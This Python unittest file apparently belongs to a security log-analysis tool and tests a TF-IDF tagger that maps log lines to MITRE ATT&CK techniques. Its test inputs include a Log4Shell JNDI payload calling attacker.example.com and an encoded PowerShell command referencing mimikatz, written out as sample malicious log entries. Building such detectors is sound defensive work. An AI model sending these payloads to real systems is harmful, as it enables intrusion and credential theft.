"""Tests for the TF-IDF MITRE TTP tagger (Étape 3.A)."""

from __future__ import annotations

import sys
import unittest
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
sys.path.insert(0, str(PROJECT_ROOT))

from marine_log_sentinel.ml import MitreTtpTagger, expand_query_text  # noqa: E402
from marine_log_sentinel.threat_intel import load_threat_intel  # noqa: E402

_TAGGER: MitreTtpTagger | None = None


def _tagger() -> MitreTtpTagger:
    global _TAGGER
    if _TAGGER is None:
        snapshot = load_threat_intel()
        _TAGGER = MitreTtpTagger().fit(snapshot)
    return _TAGGER


def _technique_ids(hits) -> list[str]:
    return [h.technique_id for h in hits]


class TaggerFitTest(unittest.TestCase):
    def test_fitting_indexes_all_techniques(self):
        tagger = _tagger()
        artifacts = tagger._ensure_fitted()
        self.assertGreaterEqual(len(artifacts.technique_ids), 600)
        self.assertGreater(len(artifacts.vectorizer.vocabulary_), 5000)

    def test_empty_text_returns_no_hits(self):
        self.assertEqual(_tagger().predict_top_k("", k=5), [])
        self.assertEqual(_tagger().predict_top_k("   ", k=5), [])

    def test_predict_returns_sorted_unique_top_k(self):
        hits = _tagger().predict_top_k("powershell encoded base64 payload", k=5)
        self.assertGreater(len(hits), 0)
        scores = [h.score for h in hits]
        self.assertEqual(scores, sorted(scores, reverse=True))
        self.assertEqual(len(set(_technique_ids(hits))), len(hits))


class TaggerSemanticRecallTest(unittest.TestCase):
    """Each assertion is grounded in a real log we ingested in Étape 1."""

    def test_powershell_encoded_command_matches_t1059(self):
        text = (
            "powershell -EncodedCommand "
            "JABwACAAPQAgACIATQBpAG0AaQBrAGEAdAB6AC4AZQB4AGUAIgA="
        )
        hits = _tagger().predict_top_k(text, k=10)
        ids = _technique_ids(hits)
        self.assertTrue(
            any(t == "T1059" or t.startswith("T1059.") for t in ids),
            f"Expected a Command-and-Scripting-Interpreter match, got: {ids[:5]}",
        )

    def test_log4shell_jndi_payload_matches_exploit_public_facing(self):
        text = 'GET /?x=${jndi:ldap://attacker.example.com/a} HTTP/1.1'
        boosted = expand_query_text(text)
        hits = _tagger().predict_top_k(boosted, k=10)
        ids = _technique_ids(hits)
        self.assertTrue(
            any(t.startswith("T1190") or t.startswith("T1203") for t in ids),
            f"Expected an exploitation-of-public-app match, got: {ids[:5]}",
        )

    def test_failed_logon_event_matches_brute_force_or_credential_access(self):
        text = (
            "EventCode=4625 failed logon attempt for user Administrator "
            "from source workstation, multiple failures"
        )
        hits = _tagger().predict_top_k(text, k=15)
        ids = _technique_ids(hits)
        credential_access_hits = [
            h for h in hits if "credential-access" in h.tactics
        ]
        self.assertTrue(
            credential_access_hits
            or any(t.startswith("T1110") for t in ids),
            f"Expected a brute-force/credential-access match, got: {ids[:5]}",
        )

    def test_rationale_terms_explain_powershell_match(self):
        text = "powershell -EncodedCommand SQBuAHYAbwBrAGUA"
        hits = _tagger().predict_top_k(text, k=3)
        self.assertTrue(hits)
        top = hits[0]
        self.assertTrue(top.rationale_terms)
        self.assertTrue(
            any("powershell" in term for term in top.rationale_terms),
            f"Rationale should mention 'powershell', got: {top.rationale_terms}",
        )


class QueryExpansionTest(unittest.TestCase):
    def test_expand_query_doubles_known_attacker_tokens(self):
        text = "GET /a?x=${jndi:ldap://attacker} HTTP/1.1"
        expanded = expand_query_text(text)
        self.assertGreater(expanded.count("jndi:"), text.count("jndi:"))

    def test_expand_query_is_noop_when_nothing_matches(self):
        text = "GET /index.html HTTP/1.1 200"
        self.assertEqual(expand_query_text(text), text)


if __name__ == "__main__":
    unittest.main()
